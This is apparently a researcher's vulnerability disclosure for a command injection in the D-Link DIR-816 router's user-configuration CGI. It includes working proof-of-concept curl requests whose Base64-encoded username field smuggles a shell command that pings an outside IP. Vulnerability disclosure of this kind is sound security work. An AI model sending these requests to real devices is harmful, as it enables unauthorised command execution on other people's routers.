Vender ：D-Link

Firmware version:1.10 B05

Exploit Author: doudoudedi233@gmail.com

Vendor Homepage: http://www.dlink.com.cn/

Hardware Link:http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816

# report

##### Describe

​	I found some vulnerabilities in the dir-816 750m11ac wireless router , Firmware version is DIR-816A2_FWv1.10CNB05_R1B011D88210

​	The HTTP request parameter is used in the handler function of  /goform/form2userconfig.cgi route, which can construct the user name string to delete the user function. This can lead to command injection through shell metacharacters.

​	If the user can configure the router, it may cause unconditional command execution If the user can configure the router, it may cause unconditional command execution.

##### Details

​	goahead Sub_4566E0 ruction in IDA view

<img src="./img/image-20210819130609706.png" alt="image-20210819130609706" style="zoom:50%;" />

​	Select user account configuration under the maintenance option of router configuration.

<img src="./img/image-20210819142952276.png" alt="image-20210819142952276" style="zoom:50%;" />

​	The modified user name is processed through the webdecode64 function and passed to the dosystem function in the form of formatted parameters. Therefore, the user name is constructed for command injection.

```
POST /goform/form2userconfig.cgi HTTP/1.1

Host: 192.168.33.9

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 183

Origin: http://192.168.33.9

Connection: close

Referer: http://192.168.33.9/d_userconfig.asp

Cookie: curShow=

Upgrade-Insecure-Requests: 1



username=Jztsczsn&privilege=2&oldpass=&newpass=MTIz&confpass=MTIz&deluser=%E5%88%A0%E9%99%A4&select=s0&hiddenpass=192.168.33.9&submit.htm%3Fuserconfig.htm=Send&tokenid=304089172
```

​	The function uses Base64 to decode the received user name, so Base64 encoding is required.

<img src="./img/image-20210819133402633.png" alt="image-20210819133402633" style="zoom:50%;" />

<img src="./img/image-20210819133845707.png" alt="image-20210819133845707" style="zoom:50%;" />

​	 this vulnerability requires the user to have permission to configure the router

##### POC&&EXP
First, get the tokenid 
```
curl -s http://192.168.33.9/dir_login.asp  | grep tokenid
```
```
curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=JztwaW5nIDExMi4xMjYuOTkuOTE7Jw==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=xxxxx"#input id
```
It will decode our command Base64 and execute it 

##### TEST

​	First run our POC

<img src="./img/image-20210819160553286.png" alt="image-20210819160553286" style="zoom:50%;" />

​	GDB stops at the command we are about to execute

<img src="./img/image-20210819160627461.png" alt="image-20210819160627461" style="zoom:50%;" />

​	Successfully executed sh

<img src="./img/image-20210819161606757.png" alt="image-20210819161606757" style="zoom:50%;" />
